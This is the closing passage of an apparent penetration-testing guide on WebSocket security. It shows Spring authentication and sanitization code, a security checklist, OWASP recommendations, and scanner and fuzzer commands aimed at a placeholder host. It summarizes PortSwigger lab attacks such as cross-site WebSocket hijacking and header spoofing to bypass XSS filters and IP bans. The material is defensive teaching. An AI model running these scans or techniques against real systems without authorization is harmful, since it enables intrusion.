            public Message<?> preSend(Message<?> message, MessageChannel channel) {
                StompHeaderAccessor accessor =
                    MessageHeaderAccessor.getAccessor(message, StompHeaderAccessor.class);

                if (StompCommand.CONNECT.equals(accessor.getCommand())) {
                    // Validate authentication
                    String authToken = accessor.getFirstNativeHeader("X-Auth-Token");
                    if (!validateToken(authToken)) {
                        throw new MessagingException("Unauthorized");
                    }
                }

                return message;
            }
        });
    }
}

@Controller
public class ChatController {

    @MessageMapping("/chat")
    @SendTo("/topic/messages")
    public ChatMessage sendMessage(@Payload ChatMessage message, Principal principal) {
        // Validate authorization
        if (!isAuthorized(principal, message)) {
            throw new AccessDeniedException("Unauthorized");
        }

        // Sanitize input
        message.setContent(sanitizeHtml(message.getContent()));

        return message;
    }
}
```

---

### 9. Security Testing & Code Review

**Security Checklist:**

- [ ] **Authentication:** WebSocket handshake validates user identity
- [ ] **Authorization:** Every action checks user permissions
- [ ] **CSRF Protection:** CSRF tokens or equivalent in handshake
- [ ] **Origin Validation:** Origin header validated against allowlist
- [ ] **Input Validation:** All messages validated and sanitized
- [ ] **Output Encoding:** Data encoded before displaying in client
- [ ] **TLS Encryption:** wss:// used in production
- [ ] **Rate Limiting:** Connection and message rate limits implemented
- [ ] **Logging:** Security events logged for monitoring
- [ ] **Error Handling:** Errors don't leak sensitive information
- [ ] **Session Management:** Sessions properly managed and timeout
- [ ] **Message Size Limits:** Maximum message size enforced
- [ ] **Connection Limits:** Maximum concurrent connections per user

**Automated Security Testing:**
```bash
# Use OWASP ZAP for automated scanning
zap-cli quick-scan --self-contained --spider -r https://target.com

# Use Nuclei for vulnerability scanning
nuclei -u wss://target.com/chat -t websocket-vulnerabilities/

# Use custom fuzzing
python3 websocket_fuzzer.py wss://target.com/chat
```

---

### 10. OWASP WebSocket Security Cheat Sheet

**Key Recommendations:**

1. **Validate Origin header** during handshake
2. **Use CSRF tokens** or equivalent
3. **Implement proper authentication** beyond just cookies
4. **Validate and sanitize all input** on both client and server
5. **Use wss://** (WebSocket Secure) in production
6. **Implement rate limiting** for connections and messages
7. **Set message size limits** to prevent DoS
8. **Log security events** for monitoring and incident response
9. **Keep libraries updated** to patch known vulnerabilities
10. **Perform regular security testing** and code reviews

**References:**
- [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html)
- [PortSwigger WebSocket Security Testing](https://portswigger.net/web-security/websockets)

---

## Summary

WebSockets provide powerful real-time communication capabilities but introduce unique security challenges. The three PortSwigger labs demonstrate critical vulnerabilities:

1. **Message Manipulation**: Bypass client-side encoding by intercepting WebSocket messages with Burp Suite
2. **Handshake Exploitation**: Evade XSS filters and IP bans by manipulating handshake headers
3. **Cross-Site Hijacking**: Exploit missing CSRF tokens to hijack connections and steal sensitive data

**Key Takeaways:**
- WebSocket handshakes must include CSRF tokens and origin validation
- All messages must be validated and sanitized on the server side
- Never rely solely on cookies for WebSocket authentication
- Use wss:// (encrypted) in production
- Implement comprehensive logging and monitoring
- Test WebSocket endpoints as thoroughly as HTTP endpoints

**Tools:** Burp Suite, OWASP ZAP, wscat, websocat, custom Python scripts

**Real-World Impact:** CSWSH vulnerabilities have led to account takeovers in platforms like Gitpod, authentication bypasses in FortiOS (CVE-2024-55591), and RCE in Spring Framework (CVE-2018-1270).

**Next Steps:**
1. Complete all three PortSwigger labs
2. Practice on vulnerable WebSocket applications (DVWA, WebGoat)
3. Test real-world applications with proper authorization
4. Study additional CVEs and bug bounty reports
5. Implement secure WebSocket practices in your own applications

---

**Document Version:** 1.0
**Last Updated:** January 2026
**Author:** Penetration Testing Skill - WebSockets Mastery Module
**References:** PortSwigger Web Security Academy, OWASP, Real-World CVE Analysis
